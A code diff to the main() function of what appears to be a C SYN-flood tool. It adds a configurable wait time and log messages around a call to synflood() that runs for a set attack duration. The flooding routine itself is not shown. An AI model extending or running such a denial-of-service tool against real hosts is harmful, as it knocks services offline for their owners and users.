@@ -168,7 +168,7 @@ main (int argc, char *argv[], char *envp[])
   unsigned int wait_time;
   struct sockaddr_in host_addr;
   char hostname[HOSTNAME_BUFFER_LENGTH];
-  getOptions(argc, argv, hostname, &port, &host_addr, &attack_time);
+  getOptions(argc, argv, hostname, &port, &host_addr, &attack_time, &wait_time);
   current_ipv4_addr = getCurrentIpAddr();
   char current_ipv4_addr_buf[32];
   strcpy(current_ipv4_addr_buf, inet_ntoa(current_ipv4_addr));
@@ -195,7 +195,9 @@ main (int argc, char *argv[], char *envp[])
 
   alarm(attack_time);
   synflood(hostname, port, host_addr);
-  sleep(SUSPENSE_TIME);
+  vlog("waiting time : %d %s \n", wait_time, wait_time == 1 ? "second" : "seconds");
+  sleep(wait_time);
+  vlog("job finished \n" ) ; 
   
   /* It seems like pcap spawns some kind of weird daemon or regular child process that we can't
    * wait on and kill normally. So take down the entire process group! */
